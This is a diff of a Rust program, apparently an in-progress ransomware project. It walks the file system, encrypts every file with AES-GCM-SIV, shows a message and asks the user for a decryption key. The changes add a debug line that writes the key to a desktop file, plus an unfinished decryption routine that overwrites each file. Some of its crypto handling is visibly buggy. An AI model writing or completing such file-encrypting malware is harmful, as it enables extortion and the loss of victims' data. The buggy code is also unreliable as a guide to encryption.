@@ -5,6 +5,7 @@ use aes_gcm_siv::aead::Aead;
 use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
 use crossterm::event::{poll, read, Event, KeyCode};
 use crossterm::terminal::enable_raw_mode;
+use crypto::common::typenum::U32;
 use dialog::{backends::Zenity, DialogBox};
 use eframe::egui;
 use hex;
@@ -47,31 +48,43 @@ fn main() {
 
     //TESTCODE: delete later. shows the key so i dont lock myself out
     //create a file called key.txt and write the key to it
-    let mut key_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
-    writeln!(key_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
+
+    // let mut key_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
+    // writeln!(key_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
 
     traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
-                             //
-    loop {
-        let mut user_input = String::new();
-        println!("Enter decryption key pls: ");
-        io::stdin().read_line(&mut user_input).unwrap();
-        let user_input_str = user_input.as_bytes(); //convert to bytes
 
-        //TODO: UP TO HERE TODAY
-        //key length 32, nonce length 12
-        if user_input_str.len() != 32 {
-            //print error
-            println!("Invalid key length")
-        } else {
-            // //FIXME: convert byte array into key format why this no work
-            // //WHY THIS NO WORK
-            // let user_key = GenericArray::clone_from_slice(&user_input_str[0..32]);
-            // //decrypt using the key
-            // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
-        }
-        //only break the loop when the correct key is entered
-    }
+    let mut test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
+    //write the key to the file
+    writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
+
+    // let mut path = "C:\\Users\\win11\\Desktop\\key.txt";
+    // // //create a file called key.txt and write the key to it
+
+    // match File::create(&path) {
+    //     Ok(mut key_file) => match writeln!(key_file, "key: {:?}", hex::encode(&key)) {
+    //         Ok(_) => println!("Key written successfully to {}", path),
+    //         Err(e) => println!("Failed to write to file: {}", e),
+    //     },
+    //     Err(e) => println!("Failed to create file: {}", e),
+    // }
+
+    traverse(false, &cipher);
+
+    // let mut test_file = File::create("C:\\Users\\win11\\Desktop\\key.txt");
+    // //write the key to the file
+    // writeln!(test_file.as_ref().unwrap(), "key: {:?}", hex::encode(&key));
+
+    // let mut path = "C:\\Users\\win11\\Desktop\\key.txt";
+    // //create a file called key.txt and write the key to it
+
+    // match File::create(&path) {
+    //     Ok(mut key_file) => match writeln!(key_file, "key: {:?}", hex::encode(&key)) {
+    //         Ok(_) => println!("Key written successfully to {}", path),
+    //         Err(e) => println!("Failed to write to file: {}", e),
+    //     },
+    //     Err(e) => println!("Failed to create file: {}", e),
+    // }
 }
 
 fn display_message() {
@@ -251,31 +264,24 @@ fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
             println!("Invalid key length: {}", user_input_str.len());
         } else {
             let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
+            let decrypt_key: GenericArray<u8, U32> =
+                GenericArray::clone_from_slice(&user_input_bytes.as_slice());
 
-            //FIXME: up to here today
-            // let decrypt_key = GenericArray::clone_from_slice(&user_input_bytes.as_slice());
+            let mut file = File::open(path)?;
+            let mut buffer = Vec::new();
+            file.read_to_end(&mut buffer)?;
+
+            //FIXME: get nonce from first 32 bytes from file
+            let nonce = Nonce::from_slice(&buffer[0..12]);
+            let ciphertext = &buffer[12..];
+
+            let cipher = Aes256GcmSiv::new(&decrypt_key);
+            let plaintext = cipher.decrypt(nonce, buffer.as_ref());
+
+            let mut file = File::create(path)?;
+            file.set_len(0);
+            file.write_all(&plaintext.unwrap().as_slice());
         }
     }
-    //TODO: THIS CODE IS CURRENTLY IN THE MAIN FUNCTION
-    // loop {
-    //     let mut user_input = String::new();
-    //     println!("Enter decryption key pls: ");
-    //     io::stdin().read_line(&mut user_input).unwrap();
-    //     let user_input_str = user_input.as_bytes(); //convert to bytes
-
-    //     //TODO: UP TO HERE TODAY
-    //     //key length 32, nonce length 12
-    //     if user_input_str.len() != 32 {
-    //         //print error
-    //         println!("Invalid key length")
-    //     } else {
-    //         // //FIXME: convert byte array into key format why this no work
-    //         // //WHY THIS NO WORK
-    //         // let user_key = GenericArray::clone_from_slice(&user_input_str[0..32]);
-    //         // //decrypt using the key
-    //         // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
-    //     }
-    //     //only break the loop when the correct key is entered
-    // }
     Ok(())
 }
